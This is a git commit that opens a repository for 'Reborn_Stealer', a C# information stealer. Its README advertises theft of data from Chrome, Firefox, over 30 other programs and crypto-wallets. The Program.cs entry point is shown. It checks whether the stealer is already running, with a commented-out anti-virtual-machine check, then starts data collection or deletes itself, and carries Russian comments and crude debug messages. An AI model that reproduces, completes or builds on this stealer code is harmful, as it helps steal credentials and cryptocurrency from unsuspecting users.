d1efcdb98096fafc5a1528cffb191dc2581fc473
Pylu_OT_Babylu <57573492+PyluOtBabylu@users.noreply.github.com>
2020-11-13 18:10:40 +0300

    Initial commit

---
+++ README.md
@@ -0,0 +1,2 @@
+# Reborn_Stealer_ChromeV80
+ ☣️ Stealer chrome v81+, Firefox v75+, And more than 30 different programs and crypto-wallets 
---
+++ Reborn/Program.cs
@@ -0,0 +1,52 @@
+﻿using Natasha.Properties;
+using System;
+using System.Collections.Generic;
+using System.Diagnostics;
+using System.IO;
+using System.Linq;
+using System.Reflection;
+using System.Windows.Forms;
+
+namespace Reborn
+{
+    static class Program
+    {
+        [STAThread]
+        static void Main()
+        {
+            try
+            {
+                //if (!AntiVM.Inizialize()) // Антивиртуалка
+                //{
+                    if (!File.Exists(Help.DirectoryBuild + Config.ID)) // Проверка запущен ли уже стиллер
+                    {
+                        if (Process.GetProcessesByName(Process.GetCurrentProcess().ProcessName).Length == 1) // Проверка запущен ли  уже стиллер
+                        {
+                            Collection.Start();
+                        }
+                        else
+                        {
+                            Console.WriteLine("3");
+                            Sending.AutoDelete();
+                        }
+                    }
+                    else
+                    {
+                        Console.WriteLine("2");
+                        Sending.AutoDelete();
+                    }
+                //}
+                //else
+                //{
+                //    Console.WriteLine("1");
+                //    Sending.AutoDelete();
+                //}
+                Console.WriteLine("Ахуеть спасиба");
+            }
+            catch(Exception e)
+            {
+                Console.WriteLine(e + "ОХУЕТЬ, ОШИБКА ПРЯМ В ПРОГРАМ");
+            }
+        }
+    }
+}
